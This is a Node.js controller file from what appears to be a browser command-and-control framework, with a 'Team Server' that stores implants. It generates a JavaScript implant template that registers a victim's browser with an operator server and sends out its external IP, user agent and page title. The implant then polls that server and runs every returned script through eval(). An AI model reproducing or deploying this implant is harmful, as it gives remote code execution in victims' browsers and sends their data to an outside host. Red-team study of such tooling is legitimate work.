const Implant = require("../models/Implant");
const { createEvent } = require("./eventControllers");

async function generateImplant(server, callbackInterval) {

    // Validate URI for server
    server = server.replace(/\/+$/, "");
    server = server.trim().replace(/\s/g, "");
    if(/^(:\/\/)/.test(server)){
        server = `http${server}`;
    }
    if(!/^(f|ht)tps?:\/\//i.test(server)){
        server = `http://${server}`;
    }

    // Minify this before production
    const template = `
    let commands = [];
    let data = {}
    let id = "";

    async function createHID() {
        fetch("${server}/register", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                "externalIP": await fetch("https://api.ipify.org/?format=json").then((res) => res.json()).then((data) => {return data.ip}),
                "userAgent": navigator.userAgent,
                "currentTab": document.title
            })
        }).then(res => res.json()).then(data => {
            localStorage.setItem("HID", data.id);
        });
    }
    
    function setData(name, value) {
        data[name] = value;
    }

    async function poll() {
        if(localStorage.getItem("HID") == null) {
            createHID().then(() => {
                id = localStorage.getItem("HID"); 
            });
        } else {
            id = localStorage.getItem("HID");
        }

        if (id) {
            await fetch(\`${server}/\${id}\`, {
                method: "POST",
                cache: "no-cache",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    commands: commands
                }),
            }).then(response => response.json().then(responseData => {
                commands = [];
                data = {}
                responseData.forEach((payload) => {
                    const script = payload.script
                    try {
                        if (script.toUpperCase().includes("ALERT")) { // Stops alert hanging the page
                            setTimeout(function () {
                                eval(script);
                            }, 1);
                        } else {
                            eval(script);
                        }

                        commands.push({
                            id: payload.id,
                            name: payload.name,
                            author: payload.author,
                            status: "success",
                            data: JSON.stringify(data)
                        });
                    } catch (error) {
                        commands.push({
                            id: payload.id,
                            name: payload.name,
                            status: "error",
                            data: {
                                message: error.message
                            }
                        })
                    }
                });
            }));
        }
    }
    setInterval(poll, ${callbackInterval});
    poll();
`
    try {
        const implant = await Implant.create({
            server: server,
            payload: template,
            callbackInterval: callbackInterval
        })
        createEvent("Team Server", `Implant ${implant._id} created`, "info");
        return implant._id.toString();

    } catch (err) {
        return err;
    }
}

async function getImplantById(id) {
    try {
        const implant = await Implant.findById(id);
        return implant.payload;
    } catch (err) {
        return err;
    }
}

async function getAllImplants(req, res) {
    try {
        const implants = await Implant.find();
        res.status(200).json(implants);
    } catch (err) {
        res.status(400).json(err);
    }
}

async function deleteImplantById(req, res) {
    try {
        const implant = await Implant.findByIdAndDelete(req.params.id);
        res.status(200).json(implant);
    } catch (err) {
        res.status(400).json(err);
    }
}

module.exports = {
    generateImplant,
    getImplantById,
    getAllImplants,
    deleteImplantById
};